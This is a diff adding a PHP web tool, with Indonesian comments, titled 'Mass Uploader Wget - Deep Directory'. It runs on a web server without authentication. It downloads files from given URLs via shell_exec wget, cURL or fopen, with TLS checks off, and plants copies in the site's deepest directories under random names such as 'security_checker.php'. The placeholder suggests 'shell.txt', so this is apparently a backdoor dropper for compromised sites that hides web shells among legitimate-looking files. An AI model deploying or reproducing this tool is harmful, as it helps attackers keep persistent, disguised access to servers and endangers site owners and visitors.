@@ -1,0 +1,810 @@
+<?php
+// FINAL_FIXED - mass_uploader_wget.php
+// Upload massal via WGET ke direktori paling dalam - TAMPILKAN SEMUA LINK
+
+error_reporting(0);
+ini_set('display_errors', 0);
+set_time_limit(300);
+
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
+$domain = $protocol . $_SERVER['HTTP_HOST'];
+
+// ==================== NAMA SISTEM RANDOM (TANPA ANGKA) ====================
+$system_names = [
+    'config_handler',
+    'connection_core',
+    'authentication',
+    'session_tracker',
+    'cache_memory',
+    'event_dispatcher',
+    'error_logger',
+    'middleware_filter',
+    'router_controller',
+    'template_engine',
+    'file_system',
+    'image_processor',
+    'email_smtp',
+    'api_gateway',
+    'cron_job',
+    'queue_worker',
+    'search_engine',
+    'notification',
+    'backup_restore',
+    'encryption_aes',
+    'database_manager',
+    'security_checker',
+    'log_analyzer',
+    'proxy_handler',
+    'cdn_balancer',
+    'redis_cache',
+    'memcached_pool',
+    'mysql_connector',
+    'ftp_client',
+    'ssh_tunnel'
+];
+
+// ==================== FUNGSI BUAT NAMA RANDOM UNIK TANPA ANGKA ====================
+function generateRandomName($usedNames = []) {
+    global $system_names;
+    
+    $prefixes = ['v2', 'beta', 'stable', 'dev', 'prod', 'core', 'main', 'backup', 'new', 'legacy', 'ultimate', 'premium'];
+    $suffixes = ['v2', 'beta', 'stable', 'dev', 'prod', 'core', 'main', 'backup', 'new', 'legacy', 'final', 'latest', 'plus', 'pro'];
+    
+    $maxAttempts = 50;
+    for ($i = 0; $i < $maxAttempts; $i++) {
+        $baseName = $system_names[array_rand($system_names)];
+        
+        $usePrefix = rand(0, 2) === 1;
+        $useSuffix = rand(0, 2) === 1;
+        
+        $name = $baseName;
+        
+        if ($usePrefix && !empty($prefixes)) {
+            $prefix = $prefixes[array_rand($prefixes)];
+            $name = $prefix . '_' . $name;
+        }
+        
+        if ($useSuffix && !empty($suffixes)) {
+            $suffix = $suffixes[array_rand($suffixes)];
+            if ($usePrefix && $suffix == $prefix) {
+                $suffixes2 = array_diff($suffixes, [$prefix]);
+                if (!empty($suffixes2)) {
+                    $suffix = $suffixes2[array_rand($suffixes2)];
+                }
+            }
+            $name = $name . '_' . $suffix;
+        }
+        
+        if (!in_array($name, $usedNames)) {
+            return $name . '.php';
+        }
+    }
+    
+    $name1 = $system_names[array_rand($system_names)];
+    $name2 = $system_names[array_rand($system_names)];
+    $uniqueName = $name1 . '_' . $name2;
+    
+    if (!in_array($uniqueName, $usedNames)) {
+        return $uniqueName . '.php';
+    }
+    
+    return $name1 . '_copy.php';
+}
+
+// ==================== FUNGSI SCAN DIREKTORI PALING DALAM ====================
+function getDeepestDirs($path, $depth = 0, $maxDepth = 8) {
+    $result = [];
+    if (!is_dir($path) || !is_readable($path)) return $result;
+    
+    $items = @scandir($path);
+    if (!$items) return $result;
+    
+    $subdirs = [];
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        $full = $path . '/' . $item;
+        if (is_dir($full) && !is_link($full)) {
+            $subdirs[] = $full;
+        }
+    }
+    
+    if (empty($subdirs)) {
+        $result[] = $path;
+    } elseif ($depth < $maxDepth) {
+        foreach ($subdirs as $sub) {
+            $deeper = getDeepestDirs($sub, $depth + 1, $maxDepth);
+            $result = array_merge($result, $deeper);
+        }
+    } else {
+        $result[] = $path;
+    }
+    return $result;
+}
+
+// ==================== DETEKSI APAKAH shell_exec TERSEDIA ====================
+function isShellExecAvailable() {
+    if (!function_exists('shell_exec')) return false;
+    
+    $disabled = @ini_get('disable_functions');
+    if ($disabled) {
+        $disabledList = array_map('trim', explode(',', $disabled));
+        if (in_array('shell_exec', $disabledList)) return false;
+    }
+    return true;
+}
+
+// ==================== FUNGSI DOWNLOAD VIA WGET / FALLBACK ====================
+function wgetDownload($url, $targetPath) {
+    // Cek apakah shell_exec tersedia
+    if (isShellExecAvailable()) {
+        // Coba deteksi path wget
+        $wgetPath = 'wget';
+        $whichResult = @shell_exec('which wget 2>/dev/null');
+        if (!empty($whichResult)) {
+            $wgetPath = trim($whichResult);
+        }
+        
+        // Coba beberapa varian command
+        $urlEsc = escapeshellarg($url);
+        $targetEsc = escapeshellarg($targetPath);
+        
+        $commands = [
+            "$wgetPath -q --no-check-certificate --timeout=30 -O $targetEsc $urlEsc 2>&1",
+            "wget -q --no-check-certificate --timeout=30 -O $targetEsc $urlEsc 2>&1",
+        ];
+        
+        foreach ($commands as $cmd) {
+            @shell_exec($cmd);
+            clearstatcache(true, $targetPath);
+            if (file_exists($targetPath) && filesize($targetPath) > 0) {
+                return true;
+            }
+        }
+    }
+    
+    // ========== FALLBACK 1: cURL ==========
+    if (function_exists('curl_init')) {
+        $fp = @fopen($targetPath, 'w');
+        if ($fp) {
+            $ch = @curl_init($url);
+            @curl_setopt($ch, CURLOPT_FILE, $fp);
+            @curl_setopt($ch, CURLOPT_HEADER, 0);
+            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+            @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+            @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+            $ok = @curl_exec($ch);
+            @curl_close($ch);
+            @fclose($fp);
+            clearstatcache(true, $targetPath);
+            if ($ok && file_exists($targetPath) && filesize($targetPath) > 0) {
+                return true;
+            }
+        }
+    }
+    
+    // ========== FALLBACK 2: file_get_contents ==========
+    $ctx = @stream_context_create([
+        'http' => [
+            'timeout' => 60,
+            'user_agent' => 'Mozilla/5.0',
+            'follow_location' => 1,
+        ],
+        'ssl' => [
+            'verify_peer' => false,
+            'verify_peer_name' => false,
+        ]
+    ]);
+    
+    $content = @file_get_contents($url, false, $ctx);
+    if ($content !== false && strlen($content) > 0) {
+        return @file_put_contents($targetPath, $content) !== false;
+    }
+    
+    // ========== FALLBACK 3: fopen ==========
+    $src = @fopen($url, 'r', false, $ctx);
+    if ($src) {
+        $dst = @fopen($targetPath, 'w');
+        if ($dst) {
+            @stream_copy_to_stream($src, $dst);
+            @fclose($dst);
+            @fclose($src);
+            clearstatcache(true, $targetPath);
+            if (file_exists($targetPath) && filesize($targetPath) > 0) {
+                return true;
+            }
+        } else {
+            @fclose($src);
+        }
+    }
+    
+    return false;
+}
+
+// ==================== LOKASI SCAN ====================
+$scanPaths = [__DIR__, $_SERVER['DOCUMENT_ROOT']];
+$allDirs = [];
+foreach ($scanPaths as $path) {
+    if (!empty($path) && file_exists($path)) {
+        $dirs = getDeepestDirs($path);
+        $allDirs = array_merge($allDirs, $dirs);
+    }
+}
+$allDirs = array_values(array_unique($allDirs));
+$totalDirs = count($allDirs);
+
+// ==================== PROSES UPLOAD ====================
+$uploadResults = [];
+$summary = [];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload'])) {
+    $numDirs = isset($_POST['num_dirs']) ? intval($_POST['num_dirs']) : 0;
+    $selectedDirs = isset($_POST['dirs']) ? $_POST['dirs'] : [];
+    $urlsInput = isset($_POST['urls']) ? trim($_POST['urls']) : '';
+    
+    if (empty($selectedDirs) && $numDirs > 0 && $numDirs <= $totalDirs) {
+        shuffle($allDirs);
+        $selectedDirs = array_slice($allDirs, 0, $numDirs);
+    }
+    
+    $selectedCount = count($selectedDirs);
+    
+    // Parse URL (satu per baris)
+    $urls = [];
+    if (!empty($urlsInput)) {
+        $lines = preg_split('/\r\n|\r|\n/', $urlsInput);
+        foreach ($lines as $line) {
+            $line = trim($line);
+            if (!empty($line) && filter_var($line, FILTER_VALIDATE_URL)) {
+                $urls[] = $line;
+            }
+        }
+    }
+    
+    if (empty($selectedDirs)) {
+        $uploadResults[] = ['error' => true, 'msg' => 'Pilih direktori atau masukkan jumlah!'];
+    } elseif (empty($urls)) {
+        $uploadResults[] = ['error' => true, 'msg' => 'Masukkan minimal 1 URL yang valid!'];
+    } else {
+        $totalUploads = 0;
+        $allLinks = [];
+        $usedNames = [];
+        
+        foreach ($urls as $url) {
+            // Ambil nama file dari URL
+            $urlPath = parse_url($url, PHP_URL_PATH);
+            $origName = basename($urlPath);
+            if (empty($origName)) $origName = 'file';
+            
+            foreach ($selectedDirs as $dir) {
+                // Pastikan direktori writable
+                if (!is_writable($dir)) {
+                    $uploadResults[] = [
+                        'error' => true,
+                        'msg' => "Direktori tidak writable: $dir"
+                    ];
+                    continue;
+                }
+                
+                // Generate nama unik
+                $randName = generateRandomName($usedNames);
+                $usedNames[] = str_replace('.php', '', $randName);
+                
+                $target = $dir . '/' . $randName;
+                
+                if (wgetDownload($url, $target)) {
+                    $rel = str_replace($_SERVER['DOCUMENT_ROOT'], '', $target);
+                    $rel = str_replace('\\', '/', $rel);
+                    $urlResult = $domain . $rel;
+                    
+                    $uploadResults[] = [
+                        'original' => $origName,
+                        'source_url' => $url,
+                        'saved_as' => $randName,
+                        'directory' => $dir,
+                        'url' => $urlResult
+                    ];
+                    $allLinks[] = $urlResult;
+                    $totalUploads++;
+                } else {
+                    $uploadResults[] = [
+                        'error' => true,
+                        'msg' => "Gagal download: $url ke $dir"
+                    ];
+                }
+            }
+        }
+        
+        $summary = [
+            'total_uploads' => $totalUploads,
+            'total_files' => count($urls),
+            'total_dirs' => $selectedCount,
+            'all_links' => $allLinks
+        ];
+    }
+}
+
+// Info method yang tersedia
+$methodInfo = [];
+$methodInfo[] = isShellExecAvailable() ? '✅ shell_exec (wget)' : '❌ shell_exec (disabled)';
+$methodInfo[] = function_exists('curl_init') ? '✅ cURL' : '❌ cURL';
+$methodInfo[] = ini_get('allow_url_fopen') ? '✅ fopen/file_get_contents' : '❌ fopen (disabled)';
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Mass Uploader Wget - Deep Directory</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0e27;
+            padding: 20px;
+            color: #eee;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        
+        .header {
+            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .header h1 { font-size: 28px; margin-bottom: 8px; }
+        .header p { opacity: 0.9; font-size: 14px; }
+        
+        .card {
+            background: #16213e;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+        .card h3 {
+            color: #e94560;
+            margin-bottom: 20px;
+            border-left: 3px solid #e94560;
+            padding-left: 12px;
+        }
+        
+        .input-row {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            flex: 1;
+            min-width: 200px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+            font-size: 12px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #0a0e27;
+            border: 1px solid #2a2f5a;
+            border-radius: 8px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+        }
+        
+        textarea {
+            width: 100%;
+            min-height: 150px;
+            padding: 12px;
+            background: #0a0e27;
+            border: 1px solid #2a2f5a;
+            border-radius: 8px;
+            color: #4CAF50;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            resize: vertical;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .btn-primary { background: #e94560; color: white; }
+        .btn-primary:hover { background: #ff6b6b; }
+        .btn-secondary { background: #2a2f5a; color: white; }
+        .btn-secondary:hover { background: #3a3f6a; }
+        .btn-success { background: #4CAF50; color: white; }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        
+        .dirs-container {
+            max-height: 350px;
+            overflow-y: auto;
+            background: #0f3460;
+            border-radius: 10px;
+            padding: 10px;
+            margin-top: 15px;
+        }
+        .dir-item {
+            display: block;
+            padding: 8px;
+            margin: 5px 0;
+            background: #1a1f4e;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .dir-item:hover { background: #2a2f5a; }
+        .dir-item input { margin-right: 10px; }
+        .dir-path { font-size: 11px; color: #aaa; margin-top: 4px; word-break: break-all; }
+        
+        .summary {
+            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .summary-number { font-size: 48px; font-weight: bold; }
+        
+        .result-item {
+            background: #0f3460;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 12px;
+            border-left: 3px solid #4CAF50;
+        }
+        .result-item.error { border-left-color: #e94560; }
+        
+        .url-box {
+            background: #0a0e27;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 10px;
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .url-box input {
+            flex: 1;
+            background: #1a1f4e;
+            border: none;
+            padding: 10px;
+            border-radius: 6px;
+            color: #4CAF50;
+            font-size: 11px;
+            font-family: monospace;
+        }
+        .copy-btn {
+            background: #2a2f5a;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #4CAF50; }
+        
+        .links-box {
+            background: #0f3460;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        .links-list {
+            max-height: 300px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+        .link-row {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #2a2f5a;
+        }
+        .link-row code {
+            flex: 1;
+            font-size: 11px;
+            color: #4CAF50;
+            word-break: break-all;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #4CAF50;
+            padding: 12px 24px;
+            border-radius: 8px;
+            display: none;
+            z-index: 999;
+        }
+        
+        .badge-unique {
+            background: #4CAF50;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 10px;
+            margin-left: 8px;
+        }
+        
+        .badge-wget {
+            background: #ff9800;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 10px;
+            margin-left: 8px;
+        }
+        
+        .method-info {
+            background: #0f3460;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            margin-bottom: 15px;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .file-badge {
+            display: inline-block;
+            background: #e94560;
+            padding: 5px 12px;
+            margin: 5px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>⚡ MASS UPLOADER WGET - DEEP DIRECTORY ⚡</h1>
+        <p>Download file dari URL via WGET ke direktori paling dalam | Nama random UNIK (TANPA ANGKA)</p>
+    </div>
+    
+    <div class="method-info">
+        <strong>🔧 Metode Download Tersedia:</strong>
+        <?php foreach ($methodInfo as $info): ?>
+            <span><?php echo $info; ?></span>
+        <?php endforeach; ?>
+    </div>
+    
+    <form method="POST">
+        <div class="card">
+            <h3>🎯 PILIH JUMLAH DIREKTORI</h3>
+            <div class="input-row">
+                <div class="input-group">
+                    <label>📊 Masukkan angka:</label>
+                    <input type="number" name="num_dirs" id="num_dirs" min="1" max="<?php echo $totalDirs; ?>" value="5">
+                </div>
+                <div class="input-group">
+                    <label>&nbsp;</label>
+                    <button type="button" class="btn btn-primary" onclick="randomSelect()">🎲 Pilih Acak</button>
+                </div>
+            </div>
+            
+            <div class="btn-group">
+                <button type="button" class="btn btn-secondary" onclick="selectAll(true)">✅ Pilih Semua</button>
+                <button type="button" class="btn btn-secondary" onclick="selectAll(false)">❌ Hapus Semua</button>
+                <button type="button" class="btn btn-secondary" onclick="invertSelect()">🔄 Invert</button>
+                <button type="button" class="btn btn-secondary" onclick="selectFirst()">🔢 Pilih N Pertama</button>
+            </div>
+            
+            <div class="dirs-container">
+                <?php foreach ($allDirs as $dir): ?>
+                <label class="dir-item">
+                    <input type="checkbox" name="dirs[]" value="<?php echo htmlspecialchars($dir); ?>" class="dir-check">
+                    <div class="dir-path">📁 <?php echo htmlspecialchars($dir); ?></div>
+                </label>
+                <?php endforeach; ?>
+            </div>
+            <div style="margin-top: 12px;">✅ Terpilih: <span id="selectedCount">0</span> dari <?php echo $totalDirs; ?></div>
+        </div>
+        
+        <div class="card">
+            <h3>🌐 MASUKKAN URL FILE (WGET)</h3>
+            <textarea name="urls" id="urls" placeholder="https://example.com/file1.php&#10;https://example.com/file2.php&#10;https://example.com/shell.txt"><?php echo isset($_POST['urls']) ? htmlspecialchars($_POST['urls']) : ''; ?></textarea>
+            <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
+                💡 Masukkan satu URL per baris. File akan didownload menggunakan <strong>wget</strong> (dengan fallback ke cURL / file_get_contents).
+            </div>
+            <div id="urlPreview" style="margin-top: 10px;"></div>
+        </div>
+        
+        <button type="submit" name="upload" class="btn btn-primary" style="width: 100%; padding: 15px; font-size: 16px;">🚀 DOWNLOAD & UPLOAD MASSAL (WGET)</button>
+    </form>
+    
+    <?php if (!empty($summary)): ?>
+    <div class="card">
+        <h3>✅ HASIL UPLOAD</h3>
+        
+        <div class="summary">
+            <div class="summary-number"><?php echo $summary['total_uploads']; ?></div>
+            <div>Total File Berhasil Diupload</div>
+            <div style="font-size: 13px; margin-top: 5px;">
+                <?php echo $summary['total_files']; ?> URL × <?php echo $summary['total_dirs']; ?> direktori = <?php echo $summary['total_uploads']; ?> copy
+            </div>
+        </div>
+        
+        <?php foreach ($uploadResults as $result): ?>
+            <?php if (isset($result['error'])): ?>
+            <div class="result-item error">
+                <div><strong>❌ ERROR</strong></div>
+                <div style="font-size: 12px; color: #e94560; margin-top: 5px;">
+                    <?php echo htmlspecialchars($result['msg']); ?>
+                </div>
+            </div>
+            <?php else: ?>
+            <div class="result-item">
+                <div><strong>📄 <?php echo htmlspecialchars($result['original']); ?></strong></div>
+                <div style="font-size: 12px; color: #aaa; margin-top: 5px;">
+                    🌐 Source: <a href="<?php echo htmlspecialchars($result['source_url']); ?>" target="_blank" style="color: #ff9800;"><?php echo htmlspecialchars($result['source_url']); ?></a>
+                </div>
+                <div style="font-size: 12px; color: #aaa; margin-top: 3px;">
+                    📁 <?php echo htmlspecialchars($result['directory']); ?>
+                </div>
+                <div style="font-size: 12px; color: #e94560; margin-top: 3px;">
+                    🏷️ <?php echo htmlspecialchars($result['saved_as']); ?>
+                    <span class="badge-unique">UNIK</span>
+                </div>
+                <div class="url-box">
+                    <input type="text" id="url_<?php echo md5($result['url']); ?>" value="<?php echo htmlspecialchars($result['url']); ?>" readonly>
+                    <button class="copy-btn" onclick="copyUrl('<?php echo htmlspecialchars($result['url']); ?>')">📋 Copy</button>
+                    <a href="<?php echo htmlspecialchars($result['url']); ?>" target="_blank" style="color: #4CAF50;">⬇️ Download</a>
+                </div>
+            </div>
+            <?php endif; ?>
+        <?php endforeach; ?>
+        
+        <div class="links-box">
+            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
+                <strong>📋 SEMUA LINK (<?php echo count($summary['all_links']); ?> link)</strong>
+                <button class="btn btn-success" onclick="copyAllLinks()" style="padding: 8px 16px;">📋 Copy Semua Link</button>
+            </div>
+            <div class="links-list">
+                <?php foreach ($summary['all_links'] as $link): ?>
+                <div class="link-row">
+                    <code><?php echo htmlspecialchars($link); ?></code>
+                    <button class="copy-btn" onclick="copyUrl('<?php echo htmlspecialchars($link); ?>')">Copy</button>
+                </div>
+                <?php endforeach; ?>
+            </div>
+        </div>
+    </div>
+    <?php endif; ?>
+</div>
+
+<div id="toast" class="toast">✅ Link disalin!</div>
+
+<script>
+    function updateCounter() {
+        let checked = document.querySelectorAll('.dir-check:checked').length;
+        document.getElementById('selectedCount').innerText = checked;
+    }
+    
+    function selectAll(checked) {
+        document.querySelectorAll('.dir-check').forEach(cb => cb.checked = checked);
+        updateCounter();
+    }
+    
+    function invertSelect() {
+        document.querySelectorAll('.dir-check').forEach(cb => cb.checked = !cb.checked);
+        updateCounter();
+    }
+    
+    function selectFirst() {
+        let num = parseInt(document.getElementById('num_dirs').value);
+        let total = document.querySelectorAll('.dir-check').length;
+        if (num > total) num = total;
+        document.querySelectorAll('.dir-check').forEach((cb, i) => cb.checked = i < num);
+        updateCounter();
+        showToast('✅ ' + num + ' direktori pertama dipilih');
+    }
+    
+    function randomSelect() {
+        let num = parseInt(document.getElementById('num_dirs').value);
+        let total = document.querySelectorAll('.dir-check').length;
+        if (num > total) num = total;
+        
+        let checkboxes = document.querySelectorAll('.dir-check');
+        checkboxes.forEach(cb => cb.checked = false);
+        
+        let selected = 0;
+        let attempts = 0;
+        while (selected < num && attempts < 100) {
+            let rand = Math.floor(Math.random() * total);
+            if (!checkboxes[rand].checked) {
+                checkboxes[rand].checked = true;
+                selected++;
+            }
+            attempts++;
+        }
+        updateCounter();
+        showToast('🎲 ' + num + ' direktori dipilih acak');
+    }
+    
+    document.getElementById('urls').addEventListener('input', function(e) {
+        let lines = e.target.value.split('\n').filter(l => l.trim() !== '');
+        let valid = lines.filter(l => {
+            try { new URL(l.trim()); return true; } catch { return false; }
+        });
+        document.getElementById('urlPreview').innerHTML = 
+            `<span class="file-badge">🌐 ${valid.length} URL valid</span>` +
+            `<span class="file-badge">📄 ${lines.length} total baris</span>`;
+    });
+    
+    function showToast(msg) {
+        let toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.style.display = 'block';
+        setTimeout(() => toast.style.display = 'none', 2000);
+    }
+    
+    function copyUrl(text) {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(() => showToast('✅ Link disalin!'));
+        } else {
+            let textarea = document.createElement('textarea');
+            textarea.value = text;
+            textarea.style.position = 'fixed';
+            textarea.style.top = '-9999px';
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            showToast('✅ Link disalin!');
+        }
+    }
+    
+    function copyAllLinks() {
+        let links = [];
+        document.querySelectorAll('.link-row code, .url-box input').forEach(el => {
+            let url = el.value || el.textContent;
+            if (url && url.startsWith('http')) links.push(url);
+        });
+        
+        if (links.length === 0) {
+            showToast('❌ Tidak ada link');
+            return;
+        }
+        
+        let allLinks = [...new Set(links)].join('\n');
+        
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(allLinks).then(() => {
+                showToast('✅ ' + links.length + ' link disalin!');
+            });
+        } else {
+            let textarea = document.createElement('textarea');
+            textarea.value = allLinks;
+            textarea.style.position = 'fixed';
+            textarea.style.top = '-9999px';
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            showToast('✅ ' + links.length + ' link disalin!');
+        }
+    }
+    
+    updateCounter();
+</script>
+</body>
+</html>
